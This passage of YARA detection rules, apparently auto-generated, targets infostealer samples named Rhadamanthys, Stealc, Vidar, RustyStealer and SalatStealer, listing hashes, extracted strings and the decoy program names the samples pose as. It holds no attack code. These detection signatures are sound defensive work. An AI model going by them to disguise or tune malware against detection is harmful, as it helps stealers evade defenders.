      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f2af392cafd75426312e4862f6a1cedd40982bb0d49ca85f101fb60109b2b3f"
   strings:
      $s1 = "UVWSPH" fullword ascii /* reversed goodware string 'HPSWVU' */ /* score: '13.50'*/
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s3 = "CIJC!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule Rhadamanthys_signature__08a07d9be19d1f329c4ea80bf355ee64_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_08a07d9be19d1f329c4ea80bf355ee64(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "feceef9f8f77f03aa038a64b4eb5a1ae54898e3ce827e7345bba9eb49e261da1"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__08a07d9be19d1f329c4ea80bf355ee64_imphash__09774a8f {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_08a07d9be19d1f329c4ea80bf355ee64(imphash)_09774a8f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "09774a8fdc58fb31fbd0089b328ada61acee072e9e4137dce49d62544b025535"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Stealc_signature__08a07d9be19d1f329c4ea80bf355ee64_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_08a07d9be19d1f329c4ea80bf355ee64(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dc29043726368d8d998c426b351d64ed49a1b1f2572edc8267d7ed994e7d7d6d"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
      $s6 = "<iAEiQ10!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7318d8ba13163a478dbc19f16c0a742f84721121bd8016be27a228a5b1aac86b"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
      $s6 = "AhmNYP -s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash__ec64fe24 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash)_ec64fe24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec64fe244d21180574fca2a74e1c1d84983ed58dfd7992880591e7759e390f10"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "                <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s3 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s4 = "       processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s6 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s7 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
      $s8 = ";$;+;2;?;c;" fullword ascii /* score: '9.00'*/ /* hex encoded string ',' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash__f5bc4cd0 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash)_f5bc4cd0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5bc4cd08a3e95935a848c97c435a0fc41b3a118c45a5baf3e50e6e69a109aff"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "                <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s3 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s4 = "       processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s6 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s7 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
      $s8 = ";$;+;2;?;c;" fullword ascii /* score: '9.00'*/ /* hex encoded string ',' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash__fdfbc1ca {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash)_fdfbc1ca.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fdfbc1ca939418ba3fe30ef9daca82ae843fec06997f3a21d70aeb9c18f997b6"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__d7d2a39cff7498362b68f69f8e68c14e_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d7d2a39cff7498362b68f69f8e68c14e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "18c5e368c3eaf2aeec1384a23df25b67ed99495c33567a605a7dc6905ad56c8c"
   strings:
      $s1 = "OpenProcessToken failed. Error: %lu" fullword ascii /* score: '21.00'*/
      $s2 = "GetTokenInformation failed. Error: %lu" fullword ascii /* score: '15.00'*/
      $s3 = "tMtH -G" fullword ascii /* score: '8.00'*/
      $s4 = "kfPO -:" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule RustyStealer_signature__a5dfb14ac2f6087ec6c89ffbafcba376_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_a5dfb14ac2f6087ec6c89ffbafcba376(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "834c0a827df29f4101a2782cf1b3e380344080bb6b6f2901a6523cdaf86dfa29"
   strings:
      $s1 = "shellcode.pdb" fullword ascii /* score: '28.00'*/
      $s2 = "fatal runtime error: drop of the panic payload panicked, aborting" fullword ascii /* score: '21.00'*/
      $s3 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s4 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s5 = "Once instance has previously been poisoned" fullword ascii /* score: '14.00'*/
      $s6 = "library\\std\\src\\sync\\poison\\once.rs" fullword ascii /* score: '14.00'*/
      $s7 = "Local\\RustBacktraceMutex00000000" fullword ascii /* score: '11.00'*/
      $s8 = "SetThreadDescription" fullword ascii /* score: '10.00'*/
      $s9 = "library\\std\\src\\thread\\mod.rsfailed to generate unique thread ID: bitspace exhausted" fullword ascii /* score: '10.00'*/
      $s10 = "fatal runtime error: initialization or cleanup bug, aborting" fullword ascii /* score: '10.00'*/
      $s11 = "fatal runtime error: Rust panics must be rethrown, aborting" fullword ascii /* score: '10.00'*/
      $s12 = "library\\std\\src\\io\\mod.rsa formatting trait implementation returned an error when the underlying stream did not" fullword ascii /* score: '10.00'*/
      $s13 = "RUST_BACKTRACElibrary\\std\\src\\sys_common\\wtf8.rsfailed to write the buffered data" fullword ascii /* score: '10.00'*/
      $s14 = "fatal runtime error: failed to initiate panic, error , aborting" fullword ascii /* score: '10.00'*/
      $s15 = "failed to write whole buffer" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      8 of them
}

rule Stealc_signature__37801b95c438a73e300d9190a7cb0752_imphash__6626917d {
   meta:
      description = "_subset_batch - file Stealc(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_6626917d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6626917df8fea3f9516a08e8100635b1a3b8e5bd767529ed09787a4e4f3f1444"
   strings:
      $s1 = "CDzc.TPk" fullword ascii /* score: '10.00'*/
      $s2 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s3 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Stealc_signature__37801b95c438a73e300d9190a7cb0752_imphash__8e02a14d {
   meta:
      description = "_subset_batch - file Stealc(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_8e02a14d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8e02a14d123e24ae6416c999224d4065d9c54d46e76bc7d277bcca256ca4ea68"
   strings:
      $s1 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Stealc_signature__37801b95c438a73e300d9190a7cb0752_imphash__d05d6df0 {
   meta:
      description = "_subset_batch - file Stealc(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_d05d6df0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d05d6df07fb2fb70e80fb69bc8e38600b88711b2d179e024e4cb96aa43f272e5"
   strings:
      $s1 = "CDzc.TPk" fullword ascii /* score: '10.00'*/
      $s2 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s3 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Vidar_signature__37801b95c438a73e300d9190a7cb0752_imphash__5f809fd6 {
   meta:
      description = "_subset_batch - file Vidar(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_5f809fd6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5f809fd6dfd4a9835a59270b0a82fa23d4b7be207729892f58d4ed0f1cd0ea23"
   strings:
      $s1 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__e19fa692f3715134ca54de4a8b165eb4_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_e19fa692f3715134ca54de4a8b165eb4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3c2d3dd2705831ed8bd4fc730ee21877b8a28b54455c0332e3eeba157707bcb7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "OpenProcessToken failed. Error: %lu" fullword ascii /* score: '21.00'*/
      $s3 = "GetTokenInformation failed. Error: %lu" fullword ascii /* score: '15.00'*/
      $s4 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s5 = "<(=/=4=8=<=@=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'H' */
      $s6 = "ubQk* 7}" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__2195c631 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_2195c631.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2195c63144dcb0f94a6bea184c1811b3eceec353e59d442fe007addd78bc696c"
   strings:
      $s1 = "microserciasmb32rv1.exe" fullword ascii /* score: '22.00'*/
      $s2 = "libunistring-5.dll" fullword ascii /* score: '20.00'*/
      $s3 = "libpsl-5.dll" fullword ascii /* score: '20.00'*/
      $s4 = "libidn2-0.dll" fullword ascii /* score: '20.00'*/
      $s5 = "libintl-8.dllPK" fullword ascii /* score: '16.00'*/
      $s6 = "UFRFJFZFz" fullword ascii /* base64 encoded string 'PTE$VE' */ /* score: '14.00'*/
      $s7 = "libidn2-0.dllPK" fullword ascii /* score: '13.00'*/
      $s8 = "libunistring-5.dllPK" fullword ascii /* score: '13.00'*/
      $s9 = "libpsl-5.dllPK" fullword ascii /* score: '13.00'*/
      $s10 = "libiconv-2.dllPK" fullword ascii /* score: '13.00'*/
      $s11 = "microserciasmb32rv1.exePK" fullword ascii /* score: '11.00'*/
      $s12 = "8Q0I0Y0M0" fullword ascii /* base64 encoded string 'CB4cC4' */ /* score: '11.00'*/
      $s13 = "vpQpIpipepKp{pGpOpop_" fullword ascii /* score: '10.00'*/
      $s14 = "?6<6>6=6?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'ff' */
      $s15 = "* bE!v" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 10000KB and
      8 of them
}

rule Rhadamanthys_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__bcb4df3b {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_bcb4df3b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bcb4df3b203c95703ac165e532f45232b0663c4dd7e8f212b6f88982d84cef4e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v4.67.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = ":- -CW" fullword ascii /* score: '9.00'*/
      $s6 = "jsnhjba" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__047fec4c {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_047fec4c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "047fec4c79e5514024812bdd96f293ae46073f824feed92abdc29cf5279c79cf"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v7.26.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "3<'-7@^[/" fullword ascii /* score: '9.00'*/ /* hex encoded string '7' */
      $s6 = "* g\\?~" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__ff1363c1 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_ff1363c1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff1363c1e97e63037491520fd0f4b1b1f72a43c97adfc68c870505f9066cd950"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "IcDLlqp4b" fullword ascii /* score: '9.00'*/
      $s6 = "S<7 - '" fullword ascii /* score: '9.00'*/
      $s7 = "High-performance document scanning and organization software." fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule SalatStealer_signature__53ff33fd5198e78ab468db682bbdf2b7_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_53ff33fd5198e78ab468db682bbdf2b7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ddcbd13f0eb96022683d931bfee814a55413f5936bcb2cc3c829ee1ec8689f4b"
   strings:
      $s1 = "464;4@4^4" fullword ascii /* score: '9.00'*/ /* hex encoded string 'FDD' */
      $s2 = "* :'}B" fullword ascii /* score: '9.00'*/
      $s3 = "ghbtfdg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule Rhadamanthys_signature__d1d592e5 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d1d592e5.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d1d592e561e4d12e4e7f4a12c6c9e379eedb8f6633f0f3ab0ba811166d8ab7bc"
   strings:
      $s1 = "COMSupport.dll" fullword ascii /* score: '29.00'*/
      $s2 = "NLEService.dll" fullword ascii /* score: '26.00'*/
      $s3 = "DVDSetting.dll" fullword ascii /* score: '23.00'*/
      $s4 = "NLEResource.dll" fullword ascii /* score: '23.00'*/
      $s5 = "NLETransitionMgr.dll" fullword ascii /* score: '23.00'*/
      $s6 = "ExceptionHandler.dll" fullword ascii /* score: '23.00'*/
      $s7 = "BugSplat.dll" fullword ascii /* score: '23.00'*/
      $s8 = "WsBurn.dll" fullword ascii /* score: '23.00'*/
      $s9 = "WSUtilities.dll" fullword ascii /* score: '23.00'*/
      $s10 = "DBGHelp.dll" fullword ascii /* score: '23.00'*/
      $s11 = "WS_Log.dll" fullword ascii /* score: '22.00'*/
      $s12 = "WS_ImageProc.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Set-up.exe" fullword ascii /* score: '16.00'*/
      $s14 = "dCdQRjtRv" fullword ascii /* base64 encoded string 't'PF;Q' */ /* score: '14.00'*/
      $s15 = "999yyy" fullword ascii /* reversed goodware string 'yyy999' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dc607269ab0a43e6a67f5d4092be0924a1be0e7f11efff698bb4cb94b1b319f8"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "YYYYYZ" fullword ascii /* reversed goodware string 'ZYYYYY' */ /* score: '16.50'*/
      $s3 = "KYYYYY" fullword ascii /* reversed goodware string 'YYYYYK' */ /* score: '16.50'*/
      $s4 = "ZYYYXX" fullword ascii /* reversed goodware string 'XXYYYZ' */ /* score: '13.50'*/
      $s5 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s6 = "ZXXZYYYYZX" fullword ascii /* score: '9.50'*/
      $s7 = "YYXXYZXXYYYYXX" fullword ascii /* score: '9.50'*/
      $s8 = "RYYYYZZXZ" fullword ascii /* score: '9.50'*/
      $s9 = "YXXXYZXYYYYZ" fullword ascii /* score: '9.50'*/
      $s10 = "YYYYZZXXY" fullword ascii /* score: '9.50'*/
      $s11 = "+ /c!Z" fullword ascii /* score: '9.00'*/
      $s12 = "erOA /x" fullword ascii /* score: '8.00'*/
      $s13 = "+ GbmPAR]" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__81188a06 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_81188a06.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "81188a06498761380c1c242428199663551fef950efdd364d7a73e0c024a0156"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "LRXZZZXZZ" fullword ascii /* base64 encoded string 'EvYevY' */ /* score: '16.50'*/
      $s3 = "YXZXXXZZX" fullword ascii /* base64 encoded string 'avW]vY' */ /* score: '16.50'*/
      $s4 = "FXXXXXX" fullword ascii /* reversed goodware string 'XXXXXXF' */ /* score: '16.50'*/
      $s5 = "ZYYYXX" fullword ascii /* reversed goodware string 'XXYYYZ' */ /* score: '13.50'*/
      $s6 = "XZYXXX" fullword ascii /* reversed goodware string 'XXXYZX' */ /* score: '13.50'*/
      $s7 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s8 = "kircbt" fullword ascii /* score: '10.00'*/
      $s9 = "YXYYYYX" fullword ascii /* score: '9.50'*/
      $s10 = "YYZYYYYZ" fullword ascii /* score: '9.50'*/
      $s11 = "YYYYZZX" fullword ascii /* score: '9.50'*/
      $s12 = "YZXZXZYYYYXY" fullword ascii /* score: '9.50'*/
      $s13 = "YZZYYYY" fullword ascii /* score: '9.50'*/
      $s14 = "YXZXYYYY" fullword ascii /* score: '9.50'*/
      $s15 = "* 7p<N" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__ad568e19 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_ad568e19.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ad568e191fafcd83b9215ed30be548580f1e4f0e9cef7a453765a84afe82b38e"
   strings:
      $s1 = "VLC media player - Free and Open Source Media Player" fullword wide /* score: '12.00'*/
      $s2 = "getwls" fullword ascii /* score: '10.00'*/
      $s3 = "* *\\|o&" fullword ascii /* score: '9.00'*/
      $s4 = "T+ dmts?&" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__ff39b785 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_ff39b785.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff39b785672ec33edd2c0a7e4a69ab9f87a2e6c8d96b9f0e941f35fa33f13c77"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s3 = "* !34r" fullword ascii /* score: '9.00'*/
      $s4 = "* R(0l$" fullword ascii /* score: '9.00'*/
      $s5 = "5c:%S%3" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31_imphash__5704fabd {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_5704fabd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5704fabda6a0851ea156d1731b4ed4383ce102ec3a93f5d7109cc2f47f8196d0"
   strings:
      $s1 = "aurorarender.exe" fullword wide /* score: '22.00'*/
      $s2 = "YXXYXX" fullword ascii /* reversed goodware string 'XXYXXY' */ /* score: '13.50'*/
      $s3 = "XXYXYZ" fullword ascii /* reversed goodware string 'ZYXYXX' */ /* score: '13.50'*/
      $s4 = "XXXXYX" fullword ascii /* reversed goodware string 'XYXXXX' */ /* score: '13.50'*/
      $s5 = "XXYXYY" fullword ascii /* reversed goodware string 'YYXYXX' */ /* score: '13.50'*/
      $s6 = "YXYXYX" fullword ascii /* reversed goodware string 'XYXYXY' */ /* score: '13.50'*/
      $s7 = "Aurora Render - Real-time Rendering Engine" fullword wide /* score: '12.00'*/
      $s8 = "eyexy94" fullword ascii /* score: '10.00'*/
      $s9 = "eyxj9.FmH" fullword ascii /* score: '10.00'*/
      $s10 = "YYYYZZXZ" fullword ascii /* score: '9.50'*/
      $s11 = "YXXXYZYYYY" fullword ascii /* score: '9.50'*/
      $s12 = "62?['|62?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'bb' */
      $s13 = "*  &1&&" fullword ascii /* score: '9.00'*/
      $s14 = "FoVp0cD" fullword ascii /* score: '9.00'*/
      $s15 = "R? /u " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 27000KB and
      8 of them
}

rule Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31_imphash__a269d4bc {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_a269d4bc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a269d4bc0082e1bc72943667466d193fe667040aa0c5b36b953a6ee6766b7cc1"
   strings:
      $s1 = "rendercore.exe" fullword wide /* score: '22.00'*/
      $s2 = "RenderCore Engine - High-performance 3D rendering engine" fullword wide /* score: '12.00'*/
      $s3 = "dYXtL!hZ+ " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      all of them
}

rule Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31_imphash__a9ca272e {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_a9ca272e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a9ca272e70f4463ae8a76c68746c52dadd8e2106e4c31a790cddf2cad22f0b97"
   strings:
      $s1 = "BCOMDLG32.dll" fullword ascii /* score: '26.00'*/
      $s2 = "rendercore.exe" fullword wide /* score: '22.00'*/
      $s3 = "RenderCore Engine - High-performance 3D rendering engine" fullword wide /* score: '12.00'*/
      $s4 = "iddFiZ.ljU" fullword ascii /* score: '10.00'*/
      $s5 = ";}\"5}5-<" fullword ascii /* score: '9.00'*/ /* hex encoded string 'U' */
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      all of them
}

rule Stealc_signature__dc4152fd8ffd9d76d82af552da62e323_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_dc4152fd8ffd9d76d82af552da62e323(imphash).exe"
      author = "Metin Yigit"
